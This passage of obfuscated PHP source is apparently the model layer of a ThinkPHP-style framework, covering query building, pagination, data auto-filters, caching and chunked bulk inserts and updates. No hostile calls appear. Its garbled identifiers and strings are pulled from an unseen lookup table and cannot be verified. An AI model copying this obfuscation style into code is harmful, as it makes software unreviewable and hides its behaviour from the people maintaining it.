$this; } public function where($µÊÇİŞ, $Æà‡œÊû = null) { $øÑçË =& $_SERVER[‰‰Ş‚€]; if (!is_null($Æà‡œÊû) && is_string($µÊÇİŞ)) { if (!is_array($Æà‡œÊû)) { $Æà‡œÊû = func_get_args(); array_shift($Æà‡œÊû); } $Æà‡œÊû = array_map(array($this->db, $øÑçË[427]), $Æà‡œÊû); $µÊÇİŞ = vsprintf($µÊÇİŞ, $Æà‡œÊû); } elseif (is_object($µÊÇİŞ)) { $µÊÇİŞ = get_object_vars($µÊÇİŞ); } elseif (is_array($µÊÇİŞ)) { foreach ($µÊÇİŞ as $Š¬ ÷• => $¿¦‚ÉÜ) { if ((is_numeric($Š¬ ÷•) || !$Š¬ ÷•) && is_string($¿¦‚ÉÜ)) { if (strpos($¿¦‚ÉÜ, $øÑçË[434]) === 0) { continue; } think_trace($øÑçË[435], $øÑçË[22], $øÑçË[59]); die; } } } if (is_string($µÊÇİŞ) && $øÑçË[22] != $µÊÇİŞ) { $ö¸•ªË© = array(); $ö¸•ªË©[$øÑçË[436]] = $µÊÇİŞ; $µÊÇİŞ = $ö¸•ªË©; } if (isset($this->options[$øÑçË[362]])) { $this->options[$øÑçË[362]] = array_merge($this->options[$øÑçË[362]], $µÊÇİŞ); } else { $this->options[$øÑçË[362]] = $µÊÇİŞ; } return $this; } public function limit($¤Ø±îƒé, $ÉĞ¿ÕªÇ = null) { $åù¬ğæŸ =& $_SERVER[‰‰Ş‚€]; $this->options[$åù¬ğæŸ[377]] = is_null($ÉĞ¿ÕªÇ) ? $¤Ø±îƒé : $¤Ø±îƒé . $åù¬ğæŸ[60] . $ÉĞ¿ÕªÇ; return $this; } public function page($óâÚŞ», $ê ôäË‰ = null) { $Ğƒ˜¾ÊÖ =& $_SERVER[‰‰Ş‚€]; $this->options[$Ğƒ˜¾ÊÖ[437]] = is_null($ê ôäË‰) ? $óâÚŞ» : $óâÚŞ» . $Ğƒ˜¾ÊÖ[60] . $ê ôäË‰; return $this; } public function comment($¨éİĞú“) { $this->options[$_SERVER[‰‰Ş‚€][438]] = $¨éİĞú“; return $this; } public function setProperty($¨‚ˆã¹, $Ê«»§ëÇ) { if (property_exists($this, $¨‚ˆã¹)) { $this->{$¨‚ˆã¹} = $Ê«»§ëÇ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\x69\146\171\124\151\x6d\145", "\x74\151\x6d\145", "\x69\156\163\x65\162\x74\x2c\x75\160\144\141\x74\145", "\x66\x75\x6e\143\x74\x69\x6f\156"), array("\143\x72\145\141\x74\x65\124\151\155\145", "\164\151\155\145", "\151\156\x73\x65\162\164", "\x66\x75\156\x63\164\x69\157\156")); public function setDataAuto($ŠÜ÷ùÚ) { $this->dataAuto = $ŠÜ÷ùÚ; } public function __construct($öçøô¼ò = '', $•Å‡”–ß = '', $­ø‡ƒÑ = '') { parent::__construct($öçøô¼ò, $•Å‡”–ß, $­ø‡ƒÑ); } protected $tableMeta = array(); protected function _beforeInsert(&$å“æ£®, $ñ¿¢Ş™) { $õò­Ùé£ =& $_SERVER[‰‰Ş‚€]; if (!$this->checkDataAutoHas($õò­Ùé£[439])) { return; } $this->dataBeforeFilter($å“æ£®, $õò­Ùé£[439]); } protected function _beforeUpdate(&$¦Òå¯Ã, $ÂœõÈœÈ) { $Œúİó¼¤ =& $_SERVER[‰‰Ş‚€]; if (!$this->checkDataAutoHas($Œúİó¼¤[440])) { return; } $this->dataBeforeFilter($¦Òå¯Ã, $Œúİó¼¤[440]); } protected function _afterSelect(&$ÉÚªò‚Ó, $è•¸Ã„ş) { if (!is_array($ÉÚªò‚Ó)) { return; } if (!$this->checkDataAutoHas($_SERVER[‰‰Ş‚€][441])) { return; } foreach ($ÉÚªò‚Ó as &$“´®ùú–) { $this->dataAfterFilter($“´®ùú–); } unset($“´®ùú–); } protected function _afterFind(&$³öœÃğ, $®éÔ½ÇŸ) { if (!is_array($³öœÃğ)) { return; } if (!$this->checkDataAutoHas($_SERVER[‰‰Ş‚€][441])) { return; } $this->dataAfterFilter($³öœÃğ); } public static function textEncode($‰¢£ÛĞ) { if (!$‰¢£ÛĞ) { return $‰¢£ÛĞ; } $êæİµ¥° = json_encode($‰¢£ÛĞ); $êæİµ¥° = preg_replace_callback($_SERVER[‰‰Ş‚€][442], function ($Ş§›—íÜ) { return addslashes($Ş§›—íÜ[0]); }, $êæİµ¥°); return json_decode($êæİµ¥°); } public static function textDecode($ß‰Ä¢è) { $öÀæ«æ² =& $_SERVER[‰‰Ş‚€]; $ø¿ÏèØÙ = json_encode($ß‰Ä¢è); $ø¿ÏèØÙ = preg_replace_callback($öÀæ«æ²[443], function ($İÔÜÄ½ï) { return $_SERVER[‰‰Ş‚€][108]; }, $ø¿ÏèØÙ); return json_decode($ø¿ÏèØÙ); } public function setAutoIncrement($×ğÑ°Àà) { $í«üÈÃ¨ = array($this->getPk() => $×ğÑ°Àà); $É½ÆãÊ = $this->data($í«üÈÃ¨)->add(); if ($É½ÆãÊ) { $this->delete($É½ÆãÊ); } } public function getAutoIncrement() { $Ôå†Öæ = $this->getTableName(); $ôô¾¼­Æ = $this->max($this->getPk()); $ã³ÈêŠ› = $this->query("\163\x68\x6f\167\x20\164\x61\x62\x6c\145\x20\163\164\x61\164\x75\163\x20\167\x68\x65\162\x65\x20\116\141\155\x65\75\x27{$Ôå†Öæ}\47"); $±ÇÆı„¶ = $ã³ÈêŠ›[0][$_SERVER[‰‰Ş‚€][444]]; $°íºàßÀ = max($ôô¾¼­Æ, $±ÇÆı„¶); return $°íºàßÀ; } protected function _callBefore($½Òø®Åé, $üì×Œá) { return $this->cacheCallCheck($½Òø®Åé, $üì×Œá, !1); } protected function _callAfter($„Ûæô„´, $°ï¼È¸) { return $this->cacheCallCheck($„Ûæô„´, $°ï¼È¸, !0); } protected function cacheFunctionAlias($ÊäÔµÏ‚) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($âÃŞÔ‘Ã, $˜ÀéŞ¾, $…ÏÌŸí = false) { $ï—ıƒóñ =& $_SERVER[‰‰Ş‚€]; $•Ö¤›ùâ = $this->cacheFunctionAlias($˜ÀéŞ¾); if (!$•Ö¤›ùâ) { return; } foreach ($•Ö¤›ùâ as $£şçıéı => $–¹¦³ò) { $Ì¹¾˜á = $–¹¦³ò[0]; $¬¤ÕÄ÷§ = explode($ï—ıƒóñ[60], $–¹¦³ò[1]); $ì«‡®ş = isset($–¹¦³ò[2]) ? $–¹¦³ò[2] : $ï—ıƒóñ[22]; if ($âÃŞÔ‘Ã == $£şçıéı) { return $this->cacheFunctionGet($£şçıéı, $Ì¹¾˜á, $ì«‡®ş); } if ($…ÏÌŸí && in_array($âÃŞÔ‘Ã, $¬¤ÕÄ÷§)) { $this->cacheFunctionClear($£şçıéı, $Ì¹¾˜á, $ì«‡®ş); } } } public function cacheFunctionGet($¸á«áç, $ÃÁ’ÑÒü, $²¼ÖÛÀî = '') { $×ÄŸàõ = $this->cacheKeyMake($¸á«áç, $ÃÁ’ÑÒü, $²¼ÖÛÀî); $åöÕ˜¤µ = Cache::get($×ÄŸàõ); if (!is_array($åöÕ˜¤µ)) { $åöÕ˜¤µ = call_user_func_array(array($this, $¸á«áç), array($ÃÁ’ÑÒü, !0)); Cache::set($×ÄŸàõ, $åöÕ˜¤µ); } return $åöÕ˜¤µ; } public function cacheFunctionClear($º°Ù¹¿, $¿ŒàÂĞ, $Ó˜Ğ´¼³ = '') { $–¦Ğóì‹ = $¿ŒàÂĞ; if (!is_array($¿ŒàÂĞ)) { $–¦Ğóì‹ = array($¿ŒàÂĞ); } foreach ($–¦Ğóì‹ as $Æ›Ò±å£) { $ºÛ÷¹ß­ = $this->cacheKeyMake($º°Ù¹¿, $Æ›Ò±å£, $Ó˜Ğ´¼³); Cache::remove($ºÛ÷¹ß­); } } public function cacheKeyMake($¸¢åıÏ, $àÍ»şŒĞ, $Ã¹‰ÉÈÑ) { $Ç»š¾àÈ =& $_SERVER[‰‰Ş‚€]; if ($Ã¹‰ÉÈÑ) { $àÍ»şŒĞ = $àÍ»şŒĞ . $Ç»š¾àÈ[445] . $Ã¹‰ÉÈÑ; } return get_class($this) . $Ç»š¾àÈ[21] . $¸¢åıÏ . $Ç»š¾àÈ[446] . $àÍ»şŒĞ; } protected function selectPageReset() { $¯Á˜“… =& $_SERVER[‰‰Ş‚€]; if (isset($GLOBALS[$¯Á˜“…[447]])) { return; } $GLOBALS[$¯Á˜“…[447]] = isset($GLOBALS[$¯Á˜“…[17]][$¯Á˜“…[448]]) ? $GLOBALS[$¯Á˜“…[17]][$¯Á˜“…[448]] : !1; $GLOBALS[$¯Á˜“…[449]] = isset($GLOBALS[$¯Á˜“…[17]][$¯Á˜“…[437]]) ? $GLOBALS[$¯Á˜“…[17]][$¯Á˜“…[437]] : !1; $GLOBALS[$¯Á˜“…[17]][$¯Á˜“…[448]] = !1; $GLOBALS[$¯Á˜“…[17]][$¯Á˜“…[437]] = !1; } protected function selectPageRestore() { $…¯«¢÷³ =& $_SERVER[‰‰Ş‚€]; if (!isset($GLOBALS[$…¯«¢÷³[447]])) { return; } $GLOBALS[$…¯«¢÷³[17]][$…¯«¢÷³[448]] = $GLOBALS[$…¯«¢÷³[447]]; $GLOBALS[$…¯«¢÷³[17]][$…¯«¢÷³[437]] = $GLOBALS[$…¯«¢÷³[449]]; if ($GLOBALS[$…¯«¢÷³[17]][$…¯«¢÷³[448]] === !1) { unset($GLOBALS[$…¯«¢÷³[17]][$…¯«¢÷³[448]]); } if ($GLOBALS[$…¯«¢÷³[17]][$…¯«¢÷³[437]] === !1) { unset($GLOBALS[$…¯«¢÷³[17]][$…¯«¢÷³[437]]); } unset($GLOBALS[$…¯«¢÷³[447]]); unset($GLOBALS[$…¯«¢÷³[449]]); } protected function selectPage($µªıÅÕ± = 200, $Ú‰å¹Ü¢ = 1) { $Îı€ËŞ =& $_SERVER[‰‰Ş‚€]; global $in; $õƒª‚éÑ = $this->optionsValue(); $§“ï½Œ = 50000; $µªıÅÕ± = isset($in[$Îı€ËŞ[448]]) && $in[$Îı€ËŞ[448]] ? $in[$Îı€ËŞ[448]] : $µªıÅÕ±; if ($µªıÅÕ± === -1) { $in[$Îı€ËŞ[448]] = !1; $§“ï½Œ = 100000000; $µªıÅÕ± = $§“ï½Œ; } $¡µ°³åÕ = $õƒª‚éÑ; $¡µ°³åÕ[$Îı€ËŞ[450]] = array(); $µªıÅÕ± = intval($µªıÅÕ±); $µªıÅÕ± = $µªıÅÕ± <= 5 ? 5 : ($µªıÅÕ± >= $§“ï½Œ ? $§“ï½Œ : $µªıÅÕ±); $Ú‰å¹Ü¢ = intval(isset($in[$Îı€ËŞ[437]]) && $in[$Îı€ËŞ[437]] ? $in[$Îı€ËŞ[437]] : $Ú‰å¹Ü¢); $Ú‰å¹Ü¢ = $Ú‰å¹Ü¢ <= 1 ? 1 : $Ú‰å¹Ü¢; $ááÏ¸•Â = array(); $òÔ»ãù = 1; if ($Ú‰å¹Ü¢ == 1 && $òÔ»ãù) { $this->optionsValue($õƒª‚éÑ); $ááÏ¸•Â = $this->page($Ú‰å¹Ü¢, $µªıÅÕ±)->select(); $ÎÖİóë³ = is_array($ááÏ¸•Â) ? count($ááÏ¸•Â) : 0; if ($ÎÖİóë³ < $µªıÅÕ±) { $ğÍ³š¢ò = 1; } else { $this->optionsValue($¡µ°³åÕ); $ÎÖİóë³ = intval($this->count()); $ğÍ³š¢ò = ceil($ÎÖİóë³ / $µªıÅÕ±); } } else { $this->optionsValue($¡µ°³åÕ); $ÎÖİóë³ = intval($this->count()); $ğÍ³š¢ò = ceil($ÎÖİóë³ / $µªıÅÕ±); $Ú‰å¹Ü¢ = $Ú‰å¹Ü¢ >= $ğÍ³š¢ò ? $ğÍ³š¢ò : $Ú‰å¹Ü¢; $this->optionsValue($õƒª‚éÑ); $ááÏ¸•Â = $this->page($Ú‰å¹Ü¢, $µªıÅÕ±)->select(); } if (!is_array($ááÏ¸•Â)) { $ááÏ¸•Â = array(); } if ($ğÍ³š¢ò == 1) { $ÎÖİóë³ = count($ááÏ¸•Â); } $Á¼ñÍ®Œ = array($Îı€ËŞ[451] => array($Îı€ËŞ[452] => $ÎÖİóë³, $Îı€ËŞ[448] => $µªıÅÕ±, $Îı€ËŞ[437] => $Ú‰å¹Ü¢, $Îı€ËŞ[453] => $ğÍ³š¢ò), $Îı€ËŞ[454] => $ááÏ¸•Â); return $Á¼ñÍ®Œ; } protected function checkLength($úÏ¡ß²Û, $é´ ¬…Å = 0, $Ö¾œé¥ = '') { $ğ×àä³º =& $_SERVER[‰‰Ş‚€]; $é´ ¬…Å = $é´ ¬…Å ? $é´ ¬…Å : 65536; if (!$úÏ¡ß²Û || strlen($úÏ¡ß²Û) < $é´ ¬…Å) { return; } $Ö¾œé¥ = $Ö¾œé¥ ? $Ö¾œé¥ . $ğ×àä³º[84] : $ğ×àä³º[22]; show_json($Ö¾œé¥ . LNG($ğ×àä³º[455]) . "\x28{$é´ ¬…Å}\51", !1); } protected function metaSet($ÂæÙ€Ê, $õ«¼¥ = null, $½€ŸÂû¯ = null) { $ò€û¦óâ =& $_SERVER[‰‰Ş‚€]; if (!$this->tableMeta || !$ÂæÙ€Ê) { return !1; } $øÀıåÂ™ = $this->tableMeta[$ò€û¦óâ[456]]; $¥ÚÑú± = $this->tableMeta[$ò€û¦óâ[457]]; $ƒÖ“ÛÓÑ = Model($¥ÚÑú±); $®ô‡¡æƒ = array($øÀıåÂ™ => $ÂæÙ€Ê, $ò€û¦óâ[458] => $õ«¼¥); if (is_null($õ«¼¥)) { return $ƒÖ“ÛÓÑ->where(array($øÀıåÂ™ => $ÂæÙ€Ê))->delete(); } if (is_null($½€ŸÂû¯) && is_string($õ«¼¥)) { return $ƒÖ“ÛÓÑ->where($®ô‡¡æƒ)->delete(); } $ÈİóÒ­ = is_array($õ«¼¥) ? $õ«¼¥ : array(); if (is_string($õ«¼¥)) { $ÈİóÒ­[$õ«¼¥] = $½€ŸÂû¯; } $ı’ã“²È = array(); foreach ($ÈİóÒ­ as $Ñ‹û¶­Æ => $”‘»¾ş—) { if (is_null($”‘»¾ş—) && is_string($Ñ‹û¶­Æ)) { $ƒÖ“ÛÓÑ->where(array($øÀıåÂ™ => $ÂæÙ€Ê, $ò€û¦óâ[458] => $Ñ‹û¶­Æ))->delete(); continue; } $this->checkLength($”‘»¾ş—, !1, $¥ÚÑú± . $ò€û¦óâ[14] . $Ñ‹û¶­Æ); $ı’ã“²È[] = array($øÀıåÂ™ => $ÂæÙ€Ê, $ò€û¦óâ[105] => $Ñ‹û¶­Æ, $ò€û¦óâ[459] => $”‘»¾ş—); } $º™ı¡“Å = $ò€û¦óâ[460] . $¥ÚÑú±; CacheLock::lock($º™ı¡“Å); $ƒÖ“ÛÓÑ->where(array($øÀıåÂ™ => $ÂæÙ€Ê))->addAll($ı’ã“²È, array(), !0); CacheLock::unlock($º™ı¡“Å); return !0; } public function metaGet($¶–°ÜÅ’, $âÔİ·È = false) { $ÄÌå¯·ğ =& $_SERVER[‰‰Ş‚€]; if (!$this->tableMeta) { return array(); } $°û‹‹…ï = $this->tableMeta[$ÄÌå¯·ğ[456]]; $Â£»Û«‰ = Model($this->tableMeta[$ÄÌå¯·ğ[457]]); if ($âÔİ·È) { $®ğ¬‘«Ô = array($°û‹‹…ï => $¶–°ÜÅ’, $ÄÌå¯·ğ[105] => $âÔİ·È); return $Â£»Û«‰->where($®ğ¬‘«Ô)->getField($ÄÌå¯·ğ[459]); } $®ğ¬‘«Ô = array($°û‹‹…ï => $¶–°ÜÅ’); $ÁÇÏ¡Û™ = $Â£»Û«‰->field($ÄÌå¯·ğ[461])->where($®ğ¬‘«Ô)->select(); $ÁÇÏ¡Û™ = array_to_keyvalue($ÁÇÏ¡Û™, $ÄÌå¯·ğ[105], $ÄÌå¯·ğ[459]); return $ÁÇÏ¡Û™; } private function checkDataAutoHas($İí•ëÁ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ìë’È¥) { if (in_array($İí•ëÁ, explode($_SERVER[‰‰Ş‚€][60], $ìë’È¥[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$€¨Ü–ôõ, $¡Ïæª¢) { $èÛ‘Õ³Ô =& $_SERVER[‰‰Ş‚€]; if (!is_array($€¨Ü–ôõ)) { return; } foreach ($this->dataAuto as $¨º–‰‹ã) { $’í¯É«– = $¨º–‰‹ã[0]; if (!in_array($¡Ïæª¢, explode($èÛ‘Õ³Ô[60], $¨º–‰‹ã[2]))) { continue; } switch (trim($¨º–‰‹ã[3])) { case $èÛ‘Õ³Ô[405]: case $èÛ‘Õ³Ô[406]: $òÂˆ¾•ã = $¨º–‰‹ã[1]; $ÕÔÅ¥¬Ó = isset($¨º–‰‹ã[4]) ? (array) $¨º–‰‹ã[4] : array(); if ($òÂˆ¾•ã == $èÛ‘Õ³Ô[215] && array_key_exists($’í¯É«–, $€¨Ü–ôõ)) { if (!$€¨Ü–ôõ[$’í¯É«–]) { unset($€¨Ü–ôõ[$’í¯É«–]); } break; } if (isset($€¨Ü–ôõ[$’í¯É«–])) { array_unshift($ÕÔÅ¥¬Ó, $€¨Ü–ôõ[$’í¯É«–]); } if ($èÛ‘Õ³Ô[405] == $¨º–‰‹ã[3]) { $€¨Ü–ôõ[$’í¯É«–] = call_user_func_array($òÂˆ¾•ã, $ÕÔÅ¥¬Ó); } else { $€¨Ü–ôõ[$’í¯É«–] = call_user_func_array(array(&$this, $òÂˆ¾•ã), $ÕÔÅ¥¬Ó); } break; case $èÛ‘Õ³Ô[357]: if (isset($€¨Ü–ôõ[$’í¯É«–]) && $€¨Ü–ôõ[$’í¯É«–]) { $€¨Ü–ôõ[$’í¯É«–] = call_user_func_array(array(&$this, $¨º–‰‹ã[1]), array($€¨Ü–ôõ[$’í¯É«–])); } break; case $èÛ‘Õ³Ô[360]: $€¨Ü–ôõ[$’í¯É«–] = $€¨Ü–ôõ[$¨º–‰‹ã[1]]; break; case $èÛ‘Õ³Ô[378]: if (isset($€¨Ü–ôõ[$’í¯É«–]) && !is_string($€¨Ü–ôõ[$’í¯É«–])) { $€¨Ü–ôõ[$’í¯É«–] = json_encode_force($€¨Ü–ôõ[$’í¯É«–]); } break; case $èÛ‘Õ³Ô[407]: if ($€¨Ü–ôõ[$’í¯É«–] === $èÛ‘Õ³Ô[22]) { unset($€¨Ü–ôõ[$’í¯É«–]); } break; case $èÛ‘Õ³Ô[408]: $€¨Ü–ôõ[$’í¯É«–] = $¨º–‰‹ã[1]; default: break; } } if ($¡Ïæª¢ == $èÛ‘Õ³Ô[439]) { $ÆÇÉÓê– = strtolower($this->db->getDbType()); if (strpos($ÆÇÉÓê–, $èÛ‘Õ³Ô[23]) !== 0) { return; } $“çëÄÎ‰ = $this->field(!0)->fields; $§›ˆñ¨ = $“çëÄÎ‰[$èÛ‘Õ³Ô[339]]; if (isset($“çëÄÎ‰[$èÛ‘Õ³Ô[338]])) { unset($§›ˆñ¨[$“çëÄÎ‰[$èÛ‘Õ³Ô[338]]]); } foreach ($§›ˆñ¨ as $Û¹“’ôÄ => $¡Ïæª¢) { if (!isset($€¨Ü–ôõ[$Û¹“’ôÄ])) { $€¨Ü–ôõ[$Û¹“’ôÄ] = $èÛ‘Õ³Ô[22]; } } } } private function dataAfterFilter(&$Íµü§¡¶) { $ç‘»åé =& $_SERVER[‰‰Ş‚€]; foreach ($this->dataAuto as $¤ı÷¾„”) { $ÙøÇ³ = $¤ı÷¾„”[0]; if (!isset($Íµü§¡¶[$ÙøÇ³])) { continue; } if (!in_array($ç‘»åé[441], explode($ç‘»åé[60], $¤ı÷¾„”[2]))) { continue; } switch (trim($¤ı÷¾„”[3])) { case $ç‘»åé[405]: case $ç‘»åé[406]: $”¥”¼Ä” = isset($¤ı÷¾„”[4]) ? (array) $¤ı÷¾„”[4] : array(); array_unshift($”¥”¼Ä”, $Íµü§¡¶[$ÙøÇ³]); if (isset($¤ı÷¾„”[4]) && $¤ı÷¾„”[4] == $ç‘»åé[462]) { $”¥”¼Ä” = array($Íµü§¡¶[$ÙøÇ³]); } if ($ç‘»åé[405] == $¤ı÷¾„”[3]) { $Íµü§¡¶[$ÙøÇ³] = call_user_func_array($¤ı÷¾„”[1], $”¥”¼Ä”); } else { $Íµü§¡¶[$ÙøÇ³] = call_user_func_array(array(&$this, $¤ı÷¾„”[1]), $”¥”¼Ä”); } break; case $ç‘»åé[357]: if (isset($Íµü§¡¶[$ÙøÇ³]) && $Íµü§¡¶[$ÙøÇ³]) { $Íµü§¡¶[$ÙøÇ³] = call_user_func_array(array(&$this, $¤ı÷¾„”[1]), array($Íµü§¡¶[$ÙøÇ³])); } break; case $ç‘»åé[360]: $Íµü§¡¶[$ÙøÇ³] = $Íµü§¡¶[$¤ı÷¾„”[1]]; break; case $ç‘»åé[378]: $ñœ¯¡Ç£ = $Íµü§¡¶[$ÙøÇ³]; $Íµü§¡¶[$ÙøÇ³] = json_decode($ñœ¯¡Ç£, !0); if (is_null($Íµü§¡¶[$ÙøÇ³])) { $Íµü§¡¶[$ÙøÇ³] = $ñœ¯¡Ç£; } break; case $ç‘»åé[407]: if ($Íµü§¡¶[$ÙøÇ³] === $ç‘»åé[22]) { unset($Íµü§¡¶[$ÙøÇ³]); } break; case $ç‘»åé[408]: $Íµü§¡¶[$ÙøÇ³] = $¤ı÷¾„”[1]; break; default: break; } } } public function saveAll($Ëî´É‹, $‚£ãÂêÍ = false) { $”á­©ª­ =& $_SERVER[‰‰Ş‚€]; $âçö§ü = $this->db; $§·ÑÛŒ° = $this->tablePrefix . $this->tableName; $¤àåšŞ = $this->saveAllChunkMake($Ëî´É‹); $‚£ãÂêÍ = is_array($‚£ãÂêÍ) ? $‚£ãÂêÍ : array(); foreach ($¤àåšŞ as $Ñşïš) { $¿Ë„Ÿ¯µ = $”á­©ª­[22]; $Ô¸§ú³ô = $”á­©ª­[22]; $¡èƒú• = array(); $ˆÌ‚ÓÎƒ = array(); foreach ($Ñşïš as $ÁÀê¼ÕĞ => $ÂìœüØ) { $¿Ë„Ÿ¯µ = $ÂìœüØ[$”á­©ª­[463]]; $ˆÌ‚ÓÎƒ[] = $ÂìœüØ[$”á­©ª­[464]]; $šŒÏÅç = $âçö§ü->parseValue($ÂìœüØ[$”á­©ª­[464]]); foreach ($ÂìœüØ[$”á­©ª­[465]] as $èœºêû‰ => $íÒ±ĞŠÄ) { if (!$¡èƒú•[$èœºêû‰]) { $¡èƒú•[$èœºêû‰] = array(); } $¡èƒú•[$èœºêû‰][] = $”á­©ª­[466] . $šŒÏÅç . $”á­©ª­[467] . $âçö§ü->parseValue($íÒ±ĞŠÄ); } } $É¦åÜô” = $¿Ë„Ÿ¯µ; $É¦åÜô” = $âçö§ü->parseKey($É¦åÜô”); foreach ($¡èƒú• as $èœºêû‰ => $¨ãä…) { $Ô¸§ú³ô .= $”á­©ª­[10] . $âçö§ü->parseKey($èœºêû‰) . $”á­©ª­[468] . $É¦åÜô” . $”á­©ª­[469]; $Ô¸§ú³ô .= implode($”á­©ª­[10], $¨ãä…) . $”á­©ª­[470]; } $“Ôä¦ÔÈ = $‚£ãÂêÍ; $“Ôä¦ÔÈ[$¿Ë„Ÿ¯µ] = array($”á­©ª­[17], $ˆÌ‚ÓÎƒ); $ÇŸàæª² = "\125\x50\104\101\x54\105\x20\x60{$§·ÑÛŒ°}\140\x20\123\105\124\40" . rtrim($Ô¸§ú³ô, $”á­©ª­[60]) . $”á­©ª­[10] . $âçö§ü->parseWhere($“Ôä¦ÔÈ); $this->execute($ÇŸàæª²); $this->chunkEventCheck(count($Ñşïš)); } $this->chunkEventSet(); } public function saveAllEach($ÂÄ¬üÜÉ, $¥ëü¤†§ = false) { $Ğ„ï†Çï =& $_SERVER[‰‰Ş‚€]; $¦ÀèŒ” = $this->db; $’ìÓªŒ = $this->tablePrefix . $this->tableName; $Öı£ºğÀ = $this->saveAllChunkMake($ÂÄ¬üÜÉ); $¥ëü¤†§ = is_array($¥ëü¤†§) ? $¥ëü¤†§ : array(); foreach ($Öı£ºğÀ as $„ä™¶„) { foreach ($„ä™¶„ as $œÄâÜ¯ => $â¬¡óô) { $¬×®Ğ = $Ğ„ï†Çï[471]; foreach ($â¬¡óô[$Ğ„ï†Çï[465]] as $²¬›óñ” => $Û™´™à”) { $¬×®Ğ .= $¦ÀèŒ”->parseKey($²¬›óñ”) . $Ğ„ï†Çï[472] . $¦ÀèŒ”->parseValue($Û™´™à”) . $Ğ„ï†Çï[60]; } $ŠğÇ’· = $¥ëü¤†§; $ŠğÇ’·[$â¬¡óô[$Ğ„ï†Çï[463]]] = $â¬¡óô[$Ğ„ï†Çï[464]]; $‰ü™ïÜ = "\125\x50\x44\x41\124\x45\x20\x60{$’ìÓªŒ}\140\40\123\x45\x54\x20" . rtrim($¬×®Ğ, $Ğ„ï†Çï[60]) . $Ğ„ï†Çï[473] . $¦ÀèŒ”->parseWhere($ŠğÇ’·) . $Ğ„ï†Çï[474]; $this->execute($‰ü™ïÜ); } $this->chunkEventCheck(count($„ä™¶„)); } $this->chunkEventSet(); } private function saveAllChunkMake($“•“ÕŞ×) { $õ˜ãÍÛ =& $_SERVER[‰‰Ş‚€]; $ØŒß™½º = self::SQL_WHERE_IN_CHUNK; $“•“ÕŞ× = is_array($“•“ÕŞ×) ? $“•“ÕŞ× : array(); $’Ë­±› = array(); $é—Öè™¸ = ceil(count($“•“ÕŞ×) / $ØŒß™½º); for ($Šá ø·ß = 0; $Šá ø·ß < $é—Öè™¸; $Šá ø·ß++) { $Ì¼şá‰® = array(); $ÖŒıÖ·ó = array_slice($“•“ÕŞ×, $Šá ø·ß * $ØŒß™½º, $ØŒß™½º); foreach ($ÖŒıÖ·ó as $òìàõ¯¸) { if (!is_array($òìàõ¯¸) || count($òìàõ¯¸) < 4 || count($òìàõ¯¸) % 2 != 0) { continue; } $†‡íËë­ = array(); for ($Î÷£Æ = 2; $Î÷£Æ < count($òìàõ¯¸); $Î÷£Æ += 2) { $†‡íËë­[$òìàõ¯¸[$Î÷£Æ]] = $òìàõ¯¸[$Î÷£Æ + 1]; } $Ì¼şá‰®[] = array($õ˜ãÍÛ[463] => $òìàõ¯¸[0], $õ˜ãÍÛ[464] => $òìàõ¯¸[1], $õ˜ãÍÛ[465] => $†‡íËë­); } $’Ë­±›[] = $Ì¼şá‰®; } return $’Ë­±›; } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($À—ñ·§È = false, $…¹„‚ğó = false) { $this->_chunkEvent = $À—ñ·§È; $this->_chunkEventParam = $…¹„‚ğó; } private function chunkEventCheck($æÔ”†ª®) { if (!$this->_chunkEvent) { return; } $îøãş‡ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $îøãş‡[$_SERVER[‰‰Ş‚€][475]] = $æÔ”†ª®; Hook::trigger($this->_chunkEvent, $îøãş‡); } public function addAll($Æ´î½œé, $¨ß¹÷ºİ = array(), $½´íŠê¶ = false) { $¶¡õÎÈ¥ =& $_SERVER[‰‰Ş‚€]; ignore_timeout(); $¥µ»ƒ¿Ã = self::SQL_WHERE_IN_CHUNK; if (empty($Æ´î½œé)) { $this->error = think_lang($¶¡õÎÈ¥[358]); return !1; } $¨ß¹÷ºİ = $this->_parseOptions($¨ß¹÷ºİ); foreach ($Æ´î½œé as $ìÃ×¬¨• => $¸ôïş’İ) { $Æ´î½œé[$ìÃ×¬¨•] = $this->_facade($¸ôïş’İ); $this->_beforeInsert($Æ´î½œé[$ìÃ×¬¨•], $¨ß¹÷ºİ); } if (method_exists($this->db, $¶¡õÎÈ¥[359])) { for ($ê”âõ½Ÿ = 0; $ê”âõ½Ÿ < count($Æ´î½œé); $ê”âõ½Ÿ += $¥µ»ƒ¿Ã) { $ÄûĞ¾™ƒ = array_slice($Æ´î½œé, $ê”âõ½Ÿ, $¥µ»ƒ¿Ã); if (!is_array($ÄûĞ¾™ƒ) || count($ÄûĞ¾™ƒ) == 0) { break; } $×Å†‹–  = $this->db->insertAll($ÄûĞ¾™ƒ, $¨ß¹÷ºİ, $½´íŠê¶); $this->chunkEventCheck(count($ÄûĞ¾™ƒ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Æ´î½œé as $ìÃ×¬¨• => $¸ôïş’İ) { $×Å†‹–  = $this->db->insert($¸ôïş’İ, $¨ß¹÷ºİ, $½´íŠê¶); } $this->commit(); } if (!1 !== $×Å†‹– ) { $ìóı†ß¡ = $this->getLastInsID(); if ($ìóı†ß¡) { return $ìóı†ß¡; } } return $×Å†‹– ; } public function save($¨ùØ¬ƒÇ = '', $ùÅ‚…±Ú = array()) { $šŸ•šƒŠ =& $_SERVER[‰‰Ş‚€]; $Ñ˜‚î = self::SQL_WHERE_IN_CHUNK; $•ğÔÊ = $this->optionsValue(); $ØëÃæ©½ = $this->findWhereField($•ğÔÊ); if (!$ØëÃæ©½) { return parent::save($¨ùØ¬ƒÇ, $ùÅ‚…±Ú); } $Šù°„•ã = 0; $¤€ü¸À = $•ğÔÊ[$šŸ•šƒŠ[362]][$ØëÃæ©½][1]; $¤€ü¸À = is_array($¤€ü¸À) ? $¤€ü¸À : array(); $ŞıÀ¡ß = count($¤€ü¸À); for ($Ú¼¡—«À = 0; $Ú¼¡—«À < $ŞıÀ¡ß; $Ú¼¡—«À += $Ñ˜‚î) { $Ã÷Øöš” = array_slice($¤€ü¸À, $Ú¼¡—«À, $Ñ˜‚î); if (!is_array($Ã÷Øöš”) || count($Ã÷Øöš”) == 0) { break; } 